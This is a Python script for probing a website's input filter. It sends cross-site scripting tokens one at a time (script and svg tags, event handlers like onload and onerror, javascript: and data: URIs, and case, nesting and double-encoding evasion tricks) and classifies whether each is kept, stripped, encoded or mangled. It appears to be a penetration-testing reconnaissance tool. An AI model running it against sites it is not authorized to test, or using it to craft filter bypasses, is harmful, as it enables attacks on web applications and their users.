#!/usr/bin/env python3
"""probe_filter.py — send a battery of dangerous tokens, one at a time, and
classify the filter's behavior per token as kept / stripped / encoded / mangled.

Usage:
    python3 probe_filter.py --url "https://target/search" --param q \
        --outdir evidence/filter_behavior_analysis/vec_search_q [--method POST]

Writes per-token raw responses into outdir and prints a verdict table.
Tokens are wrapped in unique canaries so the filter has nothing else to react to.
"""
import argparse
import html
import os
import re
import sys
import time
import urllib.parse
import urllib.request

TAGS = ["script", "svg", "img", "iframe", "body", "video", "audio",
        "details", "object", "embed", "math", "table", "form", "button",
        "select", "marquee", "style", "link", "meta", "base", "template",
        "slot", "noscript"]
EVENTS = ["onload", "onerror", "onclick", "onmouseover", "onfocus",
          "onanimationstart", "onpointerdown", "ontoggle", "onbegin",
          "onpageshow"]
CHARS = list('<>"\'`()=/\\;:,.!#&%+-_[]{}|~^?@*$')
SCHEMES = ["javascript:alert(1)", "JaVaScRiPt:alert(1)",
           "data:text/html,<svg onload=alert(1)>",
           "java\talert(1)".replace("\t", "%09"),
           "vbscript:msgbox(1)"]


def build_tokens():
    toks = []
    for t in TAGS:
        toks.append(("tag:" + t, "<%s>" % t))
    for e in EVENTS:
        toks.append(("event:" + e, "<svg %s=x>" % e))
    for c in CHARS:
        toks.append(("char:%r" % c, c))
    for s in SCHEMES:
        toks.append(("scheme:" + s[:20], s))
    # mutation tricks
    toks += [("case:<ScRiPt>", "<ScRiPt>alert(1)</ScRiPt>"),
             ("nested:<scr<script>ipt>", "<scr<script>ipt>alert(1)</scr<script>ipt>"),
             ("urlenc:%3Cscript%3E", "%3Cscript%3E"),
             ("dblenc:%253C", "%253Cscript%253E"),
             ("entity:&lt;", "&lt;script&gt;"),
             ("slash:<svg/onload>", "<svg/onload=alert(1)>"),
             ("tab:<svg%09onload>", "<svg%09onload=alert(1)>")]
    return toks


def send(url, param, value, method):
    data = urllib.parse.urlencode({param: value}).encode()
    if method == "GET":
        req = urllib.request.Request(url + "?" + data.decode())
    else:
        req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode("utf-8", errors="replace")
    except Exception as e:
        return "TRANSPORT_ERROR: %s" % e


def classify(body, canary, token):
    """Compare what we sent vs what came back between the canaries."""
    if body.startswith("TRANSPORT_ERROR"):
        return "transport_error"
    m = re.search(re.escape(canary) + r"(.*?)" + re.escape(canary),
                  body, re.S)
    if not m:
        # canary itself gone: check plain token presence anywhere
        if token in body:
            return "kept_no_canary"
        return "canary_stripped"
    inner = m.group(1)
    if token in inner:
        return "kept"
    # encoded forms?
    if html.escape(token) in inner or urllib.parse.quote(token) in inner:
        return "encoded"
    # token gone but canaries intact
    stripped = inner
    for ch in "<>":
        stripped = stripped.replace(ch, "")
    if token.replace("<", "").replace(">", "") in stripped or not inner.strip():
        return "stripped"
    return "mangled"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)

    print("%-28s %-16s %s" % ("token", "verdict", "note"))
    for i, (label, token) in enumerate(build_tokens()):
        canary = "pb%04d" % i
        value = canary + token + canary
        body = send(args.url, args.param, value, args.method)
        verdict = classify(body, canary, token)
        safe = re.sub(r"\W", "_", label)
        with open(os.path.join(args.outdir, "%02d_%s.html" % (i, safe)),
                  "w", encoding="utf-8") as f:
            f.write("### REQUEST value:\n%s\n\n### RESPONSE:\n%s\n"
                    % (value, body[:200000]))
        note = ""
        if verdict == "mangled":
            m = re.search(re.escape(canary) + r"(.*?)" + re.escape(canary),
                          body, re.S)
            if m:
                note = "became: %r" % m.group(1)[:60]
        print("%-28s %-16s %s" % (label, verdict, note))
        time.sleep(0.4)  # politeness: stay far under rate limits


if __name__ == "__main__":
    main()
